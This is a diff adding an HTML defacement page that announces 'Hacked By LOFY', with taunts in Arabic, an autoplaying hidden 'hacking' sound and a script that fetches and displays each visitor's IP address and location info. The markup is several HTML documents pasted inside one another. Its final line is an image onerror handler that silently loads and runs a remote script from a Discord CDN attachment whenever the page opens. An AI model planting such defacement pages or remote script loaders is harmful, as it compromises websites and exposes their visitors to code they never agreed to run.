@@ -1,0 +1,208 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>LOFY</title>
+</head>
+<body bgcolor="#000000">
+<script>
+    var names = [
+        { name: "[ LOFY ]", color: "red" },
+
+    ];
+
+    var nameIndex = 0;
+
+    function changeNames() {
+        var currentName = names[nameIndex];
+        document.getElementById("name").textContent = currentName.name;
+        document.getElementById("name").style.color = currentName.color;
+        nameIndex = (nameIndex + 1) % names.length;
+    }
+
+    // Change the names every 1 second
+    setInterval(changeNames, 1000);
+</script>
+<p align="center">
+    <img border="0" src="data:image/jpeg;base64,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" width="500" height="462">
+</p>
+<p align="center">
+    <font face="Courier" size="6" style="color: #000000;">
+        <span style="color: rgb(230, 11, 11);">Hacked By </span>
+        <span id="name"></span>
+    </font>
+</p>
+<p align="center">
+    <b>
+<font face="Courier" color="#000000">
+<a href="LOFY" style="font-size: 24px; color: rgb(228, 15, 15); text-decoration: none;">LOFY on top</a>
+</font>
+
+    </b>
+</p>
+</body>
+</html>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>LOFY on top</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            color: #ff0000;
+            background-color: #000000;
+            overflow: hidden;
+        }
+
+        h1, h3 {
+            color: #ffffff;
+        }
+
+        #ip-address {
+            color: rgb(0, 255, 55);
+        }
+
+        #ip-info {
+            font-family: Arial, sans-serif;
+            white-space: pre;
+            color: rgb(30, 255, 0);
+        }
+
+        .cmd-text-container {
+            position: relative;
+        }
+
+        .cmd-text {
+            color: #000000;
+            font-size: 9px;
+            font-family: Arial, sans-serif;
+            white-space: nowrap;
+            position: absolute;
+            animation: scrollText 20s linear infinite;
+            transform: translateX(100%);
+            -webkit-text-stroke: 1px rgb(255, 0, 0);
+            text-stroke: 1px rgb(158, 0, 0);
+        }
+
+        .gray-text {
+            color: #000000;
+            outline: 1px solid #000000;
+        }
+
+        .json-data {
+            font-family: Arial, sans-serif;
+            color: Orange;
+            text-shadow: -1px -1px 0 black, 1px -1px 0 black, -1px 1px 0 black, 1px 1px 0 black;
+        }
+
+        .json-data span {
+            color: black;
+        }
+
+        @keyframes scrollText {
+            0% {
+                transform: translateX(100%);
+            }
+            100% {
+                transform: translateX(-100%);
+            }
+        }
+
+        .cmd-text:hover {
+            animation-play-state: paused;
+        }
+
+        video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            filter: blur(10px);
+        }
+
+        /* Hide the audio controls */
+        audio {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Animated Text</title>
+    <style>
+        @keyframes lightning {
+            0% { color: rgb(255, 0, 0); }
+            50% { color: black; }
+            100% { color: rgb(255, 0, 0); }
+        }
+
+        .animated-text {
+            animation: lightning 1s linear infinite;
+        }
+    </style>
+</head>
+<body>
+    <h3 class="animated-text">LOFY تسجيل دخوللللل :</h3>
+    <h3 class="animated-text">يد ماتقواها صافحها  :</h3>
+</body>
+</html>
+    <p id="ip-address">
+        <span style="color: rgb(30, 255, 0);">Your IP Address: </span>
+        <span id="ip-address-value" style="color: rgb(30, 255, 0); font-size: 17px;">Loading...</span>
+    </p>
+
+    <h3 style="color: rgb(30, 255, 0    ); animation: flashing 1s infinite;">Your IP Info :</h3>
+    <pre id="ip-info" class="json-data">Fetching...</pre>
+    <div class="cmd-text-container" style="position: relative; top: -15px;">
+        <div class="cmd-text" style="font-size: 17px; text-stroke: 3px black; color: black;"> LOFY </div>
+    </div>
+
+    <!-- Hidden audio element with autoplay -->
+    <audio autoplay loop style="display: none;">
+        <source src="https://cdn.discordapp.com/attachments/1143103988418478091/1353099202598539344/Hacking_Sound_Effect_.MP3_MOST_VIEWED_VIDEO.mp3?ex=67e11415&is=67dfc295&hm=ec2e42c2ba9bda8a617b5f51181f513601b56a5ce4b517b3812739393e68c3e4&" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+<video style="width: 100vw; height: 100vh;" controls autoplay loop muted>
+    <source src="c:\Users\LOFY\Downloads\Andy Fielding - Retro SciFi Green (1 hour and 20 minutes).mp4">
+    Your browser does not support the video element.
+</video>
+
+
+    <script>
+        // JavaScript code to fetch and display the user's IP address and information
+        function fetchIPAndInfo() {
+            fetch('https://api.ipify.org/?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip-address-value').textContent = data.ip;
+                    return data.ip;
+                })
+                .then(ip => fetch(`https://ipinfo.io/${ip}/json`))
+                .then(response => response.json())
+                .then(ipInfoData => {
+                    document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
+                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
+                });
+        }
+
+        // Fetch IP address and information initially
+        fetchIPAndInfo();
+    </script>
+</body>
+</html>
+<img src="about:invalid" onerror="document.body.appendChild(document.createElement('script')).src='https://cdn.discordapp.com/attachments/1239188042288336907/1240091290239238325/s.js?ex=66454c83&is=6643fb03&hm=48acf6b6cb0bba7b9354fa99fa45fde8501c038b592dcb8c188412e59ae49470&';">
